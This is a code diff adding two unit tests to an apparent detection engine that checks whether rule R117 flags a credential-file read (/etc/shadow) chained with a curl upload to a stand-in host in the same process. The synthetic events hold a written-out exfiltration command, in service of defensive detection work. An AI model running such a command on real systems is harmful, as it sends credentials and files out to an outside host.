@@ -622,6 +622,67 @@ def test_real_command_credential_exfil_triggers_r117() -> None:
     assert any(chain["title"] == "Credential file access with real command exfiltration" for chain in chains)
 
 
+def test_same_pid_credential_path_and_transfer_command_triggers_r117() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH pid=4242 name="/etc/shadow"',
+            fields={"pid": "4242", "name": "/etc/shadow"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE pid=4242 a0="curl" a1="--upload-file" a2="/tmp/payload" a3="https://upload.invalid/collect"',
+            fields={"pid": "4242", "a0": "curl", "a1": "--upload-file", "a2": "/tmp/payload", "a3": "https://upload.invalid/collect"},
+        ),
+    ]
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+
+    assert "R117" in {hit.rule_id for hit in hits}
+    assert "R117" in signals["strong_chain_rules"]
+    assert signals["r117_candidate"] is False
+    assert label == 1
+    assert score >= _balanced_config["scoring"]["score_threshold"]
+
+
+def test_sample_level_credential_and_transfer_do_not_trigger_r117() -> None:
+    _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
+    events = [
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="path",
+            text='type=PATH pid=100 name="/etc/shadow"',
+            fields={"pid": "100", "name": "/etc/shadow"},
+        ),
+        Event(
+            md5="synthetic",
+            source="audit",
+            event_type="execve",
+            text='type=EXECVE pid=200 a0="curl" a1="--upload-file" a2="/tmp/payload" a3="https://upload.invalid/collect"',
+            fields={"pid": "200", "a0": "curl", "a1": "--upload-file", "a2": "/tmp/payload", "a3": "https://upload.invalid/collect"},
+        ),
+    ]
+
+    hits, signals = RuleEngine(balanced_rules).evaluate(events, {"http_post_count": 0, "dst_ports": []})
+    score, label, _risk = score_hits(hits, _balanced_config["scoring"], signals)
+
+    assert "R004" in {hit.rule_id for hit in hits}
+    assert "R117" not in {hit.rule_id for hit in hits}
+    assert signals["credential_file_path"] is True
+    assert signals["network_transfer"] is True
+    assert signals["r117_candidate"] is True
+    assert signals["strong_chain"] is False
+    assert label == 0
+    assert score < _balanced_config["scoring"]["score_threshold"]
+
+
 def test_message_credential_discussion_does_not_trigger_r117() -> None:
     _balanced_config, balanced_rules = load_config("configs/default.yaml", profile="balanced")
     events = [
